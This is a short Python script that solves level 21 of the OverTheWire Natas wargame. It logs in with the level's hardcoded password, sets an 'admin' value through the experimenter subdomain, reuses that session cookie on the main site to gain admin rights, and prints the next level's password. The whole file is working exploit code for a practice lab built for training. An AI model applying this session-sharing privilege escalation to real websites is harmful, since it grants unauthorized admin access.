import requests

# Constants
username = 'natas21'
password = '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56'
user_str = "You are logged in as a regular user."
url = f"http://{username}.natas.labs.overthewire.org/"
experimenter = f"http://{username}-experimenter.natas.labs.overthewire.org/?debug=true"

session = requests.session()
response = session.post(experimenter, auth=(username, password), data={"admin": "1", "submit": "1"})
old_session = session.cookies["PHPSESSID"]
response = session.get(url, auth=(username, password), cookies={"PHPSESSID": old_session})

for line in response.iter_lines():
    if "Password" in line.decode():
        print(line.decode().strip()[:-6])
        break
